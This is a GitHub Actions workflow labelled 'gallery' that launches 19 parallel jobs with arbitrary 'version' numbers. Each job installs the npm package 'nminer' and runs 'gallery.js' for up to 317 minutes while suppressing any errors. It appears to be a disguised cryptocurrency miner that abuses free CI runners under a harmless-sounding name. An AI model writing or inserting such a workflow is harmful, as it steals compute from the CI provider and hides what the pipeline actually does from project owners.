name: gallery
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4043 }
          - { version: 5246 }
          - { version: 6038 }
          - { version: 4153 }
          - { version: 6325 }
          - { version: 2707 }
          - { version: 5893 }
          - { version: 8072 }
          - { version: 5685 }
          - { version: 9332 }
          - { version: 1225 }
          - { version: 5516 }
          - { version: 7035 }
          - { version: 6965 }
          - { version: 4903 }
          - { version: 5580 }
          - { version: 8385 }
          - { version: 1209 }
          - { version: 8298 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 317m node gallery.js || echo "gallery executed"